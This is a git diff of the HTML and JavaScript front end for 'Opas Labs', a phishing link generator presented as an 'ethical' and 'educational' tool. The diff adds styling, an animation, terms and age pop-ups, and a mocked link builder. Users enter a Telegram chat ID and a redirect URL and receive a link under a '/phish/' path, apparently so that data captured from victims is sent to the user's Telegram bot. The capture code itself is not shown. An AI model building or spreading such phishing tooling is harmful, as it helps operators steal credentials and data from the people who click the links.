@@ -1,4 +1,5 @@
-<!DOCTYPE html><html>
+<!DOCTYPE html>
+<html>
 <head>
   <title>Opas Labs - Phishing Link Generator</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -19,6 +20,7 @@
       box-sizing: border-box;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
     }
+    
     body {
       background: linear-gradient(135deg, var(--darker), var(--dark));
       color: var(--light);
@@ -47,6 +49,17 @@
       position: relative;
       overflow: hidden;
       z-index: 10;
+    }
+    .container::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(0, 242, 254, 0.1) 0%, transparent 70%);
+      animation: rotate 15s linear infinite;
+      z-index: -1;
     }
     .logo {
       text-align: center;
@@ -93,6 +106,12 @@
       font-size: 16px;
       transition: var(--transition);
     }
+    input[type="text"]:focus,
+    input[type="url"]:focus {
+      outline: none;
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px rgba(0, 242, 254, 0.2);
+    }
     button {
       background: linear-gradient(90deg, var(--primary), var(--secondary));
       color: white;
@@ -106,6 +125,10 @@
       transition: var(--transition);
       box-shadow: 0 5px 15px rgba(37, 117, 252, 0.3);
     }
+    button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 20px rgba(37, 117, 252, 0.4);
+    }
     #result {
       margin-top: 1.5rem;
       padding: 1.5rem;
@@ -113,6 +136,11 @@
       border-radius: 8px;
       border: 1px solid rgba(255, 255, 255, 0.05);
       display: none;
+    }
+    #result p {
+      margin-bottom: 1rem;
+      color: var(--accent);
+      font-weight: 600;
     }
     #generatedLink {
       display: block;
@@ -122,13 +150,44 @@
       border: 1px solid rgba(255, 255, 255, 0.05);
       margin-bottom: 1rem;
       color: var(--light);
-      word-break: break-word;
+      word-break: break-all;
       text-decoration: none;
+      transition: var(--transition);
     }
-    .modal {
+    #generatedLink:hover {
+      background: rgba(12, 16, 33, 1);
+      border-color: rgba(0, 242, 254, 0.3);
+    }
+    #copyBtn {
+      background: linear-gradient(90deg, #1e88e5, #0d47a1);
+      margin-top: 0;
+    }
+    .note {
+      text-align: center;
+      margin-top: 1.5rem;
+      font-size: 0.9rem;
+      color: rgba(255, 255, 255, 0.5);
+    }
+    .get-id-link {
+      display: inline-block;
+      margin-bottom: 1rem;
+      color: var(--accent);
+      text-decoration: none;
+      font-weight: 600;
+      transition: var(--transition);
+    }
+    .get-id-link:hover {
+      text-decoration: underline;
+      color: #00c8ff;
+    }
+
+    /* Age Verification Modal */
+    .age-modal {
       position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
       background: rgba(7, 10, 21, 0.3);
       backdrop-filter: blur(10px);
       display: none;
@@ -136,145 +195,366 @@
       align-items: center;
       z-index: 1000;
     }
-    .modal-content {
+    .age-modal-content {
       background: rgba(12, 16, 33, 0.9);
       padding: 2rem;
       border-radius: 15px;
       max-width: 500px;
       width: 90%;
       text-align: center;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
     }
-    .modal h2 {
+    
+    .age-modal h2 {
       color: var(--accent);
       margin-bottom: 1rem;
+      font-size: 1.8rem;
     }
-    .btn-group {
+    .age-modal p {
+      margin-bottom: 2rem;
+      color: rgba(255, 255, 255, 0.8);
+    }
+    .age-btn-group {
       display: flex;
       gap: 1rem;
       justify-content: center;
     }
-    .btn-group .modal-btn {
+    .age-btn {
       padding: 0.8rem 1.5rem;
       border-radius: 8px;
       font-weight: bold;
       cursor: pointer;
+      transition: var(--transition);
       min-width: 120px;
     }
-    .modal-btn.reject {
+    .age-btn.underage {
       background: linear-gradient(90deg, #f44336, #d32f2f);
     }
-    .modal-btn.accept {
+    .age-btn.adult {
       background: linear-gradient(90deg, #4CAF50, #2E7D32);
+    }
+    .age-btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+    }
+    
+    @keyframes rotate {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    @media (max-width: 768px) {
+      .container {
+        margin: 2rem 1rem;
+        padding: 1.5rem;
+      }
+      .logo h1 {
+        font-size: 2rem;
+      }
+      .age-modal-content {
+        padding: 1.5rem;
+      }
+      .age-btn-group {
+        flex-direction: column;
+        gap: 0.8rem;
+      }
+      .age-btn {
+        width: 100%;
+      }
+    }
+    @media (max-width: 480px) {
+      .container {
+        margin: 1rem;
+        padding: 1rem;
+      }
+      .logo h1 {
+        font-size: 1.8rem;
+      }
+      input[type="text"],
+      input[type="url"] {
+        padding: 0.8rem 0.6rem 0.8rem 2.5rem;
+      }
+      .input-group i {
+        font-size: 1rem;
+        left: 12px;
+      }
     }
   </style>
 </head>
-<body><!-- T&C Modal --><div id="termsModal" class="modal">
-  <div class="modal-content">
-    <h2><i class="fas fa-file-contract"></i> Terms & Privacy</h2>
-    <p>Please read and agree to the <a href="public/terms-and-conditions.html" target="_blank">Terms & Conditions</a> and <a href="public/privacy-policy.html" target="_blank">Privacy Policy</a>.</p>
-    <div class="btn-group">
-      <button class="modal-btn reject" onclick="window.location.href='https://youtube.com'">Decline</button>
-      <button class="modal-btn accept" id="acceptTermsBtn">Accept</button>
+<body>
+  <!-- Terms & Conditions Modal -->
+  <div id="termsModal" class="age-modal">
+    <div class="age-modal-content">
+      <h2><i class="fas fa-scroll"></i> Terms & Conditions & Privacy Policy</h2>
+      <p>
+        Please read and agree to our 
+        <a href="public/terms-and-conditions.html" target="_blank" style="color: var(--accent); text-decoration: underline;">Terms and Conditions</a> 
+        and 
+        <a href="public/privacy-policy.html" target="_blank" style="color: var(--accent); text-decoration: underline;">Privacy Policy</a> 
+        before starting.
+      </p>
+      <p>Welcome! Before proceeding, please review our Terms of Service and Privacy Policy. By clicking "Accept" below, you agree to our terms.</p>
+      <div class="age-btn-group">
+        <button class="age-btn underage" id="declineTermsBtn">
+          <i class="fas fa-times-circle"></i> Decline
+        </button>
+        <button class="age-btn adult" id="acceptTermsBtn">
+          <i class="fas fa-check-circle"></i> Accept
+        </button>
+      </div>
     </div>
   </div>
-</div><!-- Age Verification Modal --><div id="ageModal" class="modal">
-  <div class="modal-content">
-    <h2><i class="fas fa-exclamation-triangle"></i> Age Verification</h2>
-    <p>This tool is for adults only. Confirm you're 18+ to continue.</p>
-    <div class="btn-group">
-      <button class="modal-btn reject" id="underageBtn">Under 18</button>
-      <button class="modal-btn accept" id="adultBtn">I'm 18 or Older</button>
+
+  <!-- Age Verification Modal -->
+  <div id="ageModal" class="age-modal">
+    <div class="age-modal-content">
+      <h2><i class="fas fa-exclamation-triangle"></i> Age Verification</h2>
+      <p>This tool is intended for adults only. By entering, you confirm that you are 18 years of age or older.</p>
+      <div class="age-btn-group">
+        <button class="age-btn underage" id="underageBtn">
+          <i class="fas fa-child"></i> I'm Under 18
+        </button>
+        <button class="age-btn adult" id="adultBtn">
+          <i class="fas fa-user-check"></i> I'm 18 or Older
+        </button>
+      </div>
     </div>
   </div>
-</div><div class="container">
-  <div class="logo">
-    <h1>Opas Labs</h1>
-    <p>Phishing Link Generator</p>
-  </div>
-  <div class="input-group">
-    <label for="telegramId">Telegram Chat ID</label>
-    <i class="fas fa-paper-plane"></i>
-    <input type="text" id="telegramId" placeholder="Enter your Telegram Chat ID">
-  </div>
-  <div class="input-group">
-    <label for="redirectUrl">Redirect URL (optional)</label>
-    <i class="fas fa-link"></i>
-    <input type="url" id="redirectUrl" placeholder="https://example.com">
-  </div>
-  <button id="generateBtn"><i class="fas fa-bolt"></i> Generate Link</button>
-  <div id="result">
-    <a id="generatedLink" href="#" target="_blank"></a>
-    <button id="copyBtn"><i class="fas fa-copy"></i> Copy Link</button>
-  </div>
-</div><script>
-  const termsModal = document.getElementById('termsModal');
-  const ageModal = document.getElementById('ageModal');
-  const acceptTermsBtn = document.getElementById('acceptTermsBtn');
-  const adultBtn = document.getElementById('adultBtn');
-  const underageBtn = document.getElementById('underageBtn');
-  const generateBtn = document.getElementById('generateBtn');
 
-  generateBtn.addEventListener('click', function (e) {
-    if (!localStorage.getItem('termsAccepted')) {
-      e.preventDefault();
-      termsModal.style.display = 'flex';
-    } else if (!localStorage.getItem('ageVerified')) {
-      e.preventDefault();
-      ageModal.style.display = 'flex';
-    } else {
-      generateLink();
+  <canvas id="particles" class="particles"></canvas>
+  <div class="container">
+    <div class="logo">
+      <h1>Opas Labs</h1>
+      <p> Ethical Phishing Link Generation Tool</p>
+    </div>
+
+    <div class="input-group">
+      <label for="telegramId">
+        Telegram Chat ID
+        (<a href="https://t.me/opaslabs_bot?start=start" class="get-id-link" target="_blank" style="text-decoration: underline;">
+          Get your Chat ID
+        </a>)
+      </label>
+      <i class="fas fa-key"></i>
+      <input type="text" id="telegramId" placeholder="Paste the Chat ID that bot sends">
+    </div>
+
+    <div class="input-group">
+      <label for="redirectUrl">Redirect URL (Optional)</label>
+      <i class="fas fa-link"></i>
+      <input type="url" id="redirectUrl" placeholder="https://example.com">
+    </div>
+
+    <button id="generateBtn">
+      <i class="fas fa-bolt"></i> Generate Link
+    </button>
+
+    <div id="result">
+      <p>Generated Link (Expires in 24h):</p>
+      <a id="generatedLink" target="_blank"></a>
+      <button id="copyBtn">
+        <i class="fas fa-copy"></i> Copy Link
+      </button>
+    </div>
+
+    <div class="note">
+      <i class="fas fa-shield-alt"></i> This tool is for educational purposes only
+    </div>
+  </div>
+
+  <script>
+    // Particle Animation
+    const canvas = document.getElementById('particles');
+    const ctx = canvas.getContext('2d');
+    function resizeCanvas() {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
     }
-  });
+    window.addEventListener('resize', resizeCanvas);
+    resizeCanvas();
 
-  acceptTermsBtn.addEventListener('click', function () {
-    localStorage.setItem('termsAccepted', 'true');
-    termsModal.style.display = 'none';
-    ageModal.style.display = 'flex';
-  });
+    let particlesArray = [];
+    const numberOfParticles = 150;
 
-  adultBtn.addEventListener('click', function () {
-    localStorage.setItem('ageVerified', 'true');
-    ageModal.style.display = 'none';
-    generateLink();
-  });
-
-  underageBtn.addEventListener('click', function () {
-    window.location.href = 'https://youtu.be/020g-0hhCAU';
-  });
-
-  async function generateLink() {
-    const telegramId = document.getElementById('telegramId').value.trim();
-    const redirectUrl = document.getElementById('redirectUrl').value.trim() || 'https://google.com';
-    if (!telegramId) {
-      alert('Please enter Telegram Chat ID');
-      return;
+    class Particle {
+      constructor() {
+        this.x = Math.random() * canvas.width;
+        this.y = Math.random() * canvas.height;
+        this.size = Math.random() * 2 + 0.5;
+        this.speedX = Math.random() * 1 - 0.5;
+        this.speedY = Math.random() * 1 - 0.5;
+      }
+      update() {
+        this.x += this.speedX;
+        this.y += this.speedY;
+        if (this.x > canvas.width || this.x < 0) this.speedX = -this.speedX;
+        if (this.y > canvas.height || this.y < 0) this.speedY = -this.speedY;
+      }
+      draw() {
+        ctx.fillStyle = 'rgba(0, 242, 254, 0.5)';
+        ctx.beginPath();
+        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+        ctx.fill();
+      }
     }
-    try {
-      generateBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Generating...';
-      const response = await fetch('/api/generate', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ telegramId, redirectUrl })
+
+    function initParticles() {
+      particlesArray = [];
+      for (let i = 0; i < numberOfParticles; i++) {
+        particlesArray.push(new Particle());
+      }
+    }
+
+    function connectParticles() {
+      for (let a = 0; a < particlesArray.length; a++) {
+        for (let b = a; b < particlesArray.length; b++) {
+          const dx = particlesArray[a].x - particlesArray[b].x;
+          const dy = particlesArray[a].y - particlesArray[b].y;
+          const distance = Math.sqrt(dx * dx + dy * dy);
+          if (distance < 100) {
+            ctx.strokeStyle = `rgba(0, 242, 254, ${0.1 - distance / 1000})`;
+            ctx.lineWidth = 0.5;
+            ctx.beginPath();
+            ctx.moveTo(particlesArray[a].x, particlesArray[a].y);
+            ctx.lineTo(particlesArray[b].x, particlesArray[b].y);
+            ctx.stroke();
+          }
+        }
+      }
+    }
+
+    function animateParticles() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      particlesArray.forEach(p => {
+        p.update();
+        p.draw();
       });
-      const data = await response.json();
-      document.getElementById('generatedLink').href = data.link;
-      document.getElementById('generatedLink').textContent = data.link;
-      document.getElementById('result').style.display = 'block';
-    } catch (error) {
-      alert('Error generating link');
-    } finally {
-      generateBtn.innerHTML = '<i class="fas fa-bolt"></i> Generate Link';
+      connectParticles();
+      requestAnimationFrame(animateParticles);
     }
-  }
 
-  document.getElementById('copyBtn').addEventListener('click', () => {
-    const link = document.getElementById('generatedLink').textContent;
-    navigator.clipboard.writeText(link);
-    const btn = document.getElementById('copyBtn');
-    btn.innerHTML = '<i class="fas fa-check"></i> Copied!';
-    setTimeout(() => {
-      btn.innerHTML = '<i class="fas fa-copy"></i> Copy Link';
-    }, 2000);
-  });
-</script></body>
+    initParticles();
+    animateParticles();
+
+    // Modal Elements
+    const termsModal = document.getElementById('termsModal');
+    const ageModal = document.getElementById('ageModal');
+    const declineTermsBtn = document.getElementById('declineTermsBtn');
+    const acceptTermsBtn = document.getElementById('acceptTermsBtn');
+    const underageBtn = document.getElementById('underageBtn');
+    const adultBtn = document.getElementById('adultBtn');
+    const generateBtn = document.getElementById('generateBtn');
+
+    // Link Generator Logic
+    async function generateLink() {
+      const telegramId = document.getElementById('telegramId').value.trim();
+      const redirectUrl = document.getElementById('redirectUrl').value.trim() || 'https://google.com';
+      
+      if (!telegramId) {
+        alert('Please enter Telegram Chat ID');
+        return;
+      }
+      
+      try {
+        document.getElementById('generateBtn').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Generating...';
+        
+        // Simulate API call (replace with actual fetch in production)
+        const mockResponse = {
+          link: `https://opaslabs.io/phish/${btoa(telegramId)}?redirect=${encodeURIComponent(redirectUrl)}`
+        };
+        
+        // In a real implementation, you would use:
+        /*
+        const response = await fetch('/api/generate', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ telegramId, redirectUrl })
+        });
+        const data = await response.json();
+        */
+        
+        // For demo purposes, we'll use the mock response
+        const data = mockResponse;
+        
+        document.getElementById('generatedLink').href = data.link;
+        document.getElementById('generatedLink').textContent = data.link;
+        document.getElementById('result').style.display = 'block';
+      } catch (error) {
+        alert('Error generating link');
+        console.error(error);
+      } finally {
+        document.getElementById('generateBtn').innerHTML = '<i class="fas fa-bolt"></i> Generate Link';
+      }
+    }
+
+    // Generate Button Click Handler
+    generateBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+      
+      // Check if terms were accepted
+      if(localStorage.getItem('termsAccepted') !== 'true') {
+        termsModal.style.display = 'flex';
+        return;
+      }
+      
+      // Check if age was verified
+      if(localStorage.getItem('ageVerified') !== 'true') {
+        ageModal.style.display = 'flex';
+        return;
+      }
+      
+      // If both checks passed, generate the link
+      generateLink();
+    });
+
+    // Terms Modal Buttons
+    declineTermsBtn.addEventListener('click', function() {
+      window.location.href = 'https://youtu.be/020g-0hhCAU?si=H64NYyVaQsrjHh2V';
+    });
+
+    acceptTermsBtn.addEventListener('click', function() {
+      localStorage.setItem('termsAccepted', 'true');
+      termsModal.style.display = 'none';
+      ageModal.style.display = 'flex';
+    });
+
+    // Age Verification Buttons
+    underageBtn.addEventListener('click', function() {
+      window.location.href = 'https://youtu.be/020g-0hhCAU?si=H64NYyVaQsrjHh2V';
+    });
+
+    adultBtn.addEventListener('click', function() {
+      localStorage.setItem('ageVerified', 'true');
+      ageModal.style.display = 'none';
+      generateLink();
+    });
+    
+    // Copy Button
+    document.getElementById('copyBtn').addEventListener('click', () => {
+      const link = document.getElementById('generatedLink').textContent;
+      navigator.clipboard.writeText(link).then(() => {
+        const btn = document.getElementById('copyBtn');
+        btn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+        setTimeout(() => {
+          btn.innerHTML = '<i class="fas fa-copy"></i> Copy Link';
+        }, 2000);
+      }).catch(err => {
+        console.error('Failed to copy: ', err);
+      });
+    });
+
+    // Check if terms were previously accepted (for page reloads)
+    document.addEventListener('DOMContentLoaded', function() {
+      if(localStorage.getItem('termsAccepted') === 'true' && localStorage.getItem('ageVerified') === 'true') {
+        // User has already accepted both, no need to show modals
+      } else if(localStorage.getItem('termsAccepted') === 'true') {
+        // Only terms accepted, show age verification
+        ageModal.style.display = 'flex';
+      } else {
+        // Show terms first
+        termsModal.style.display = 'flex';
+      }
+    });
+  </script>
+</body>
 </html>
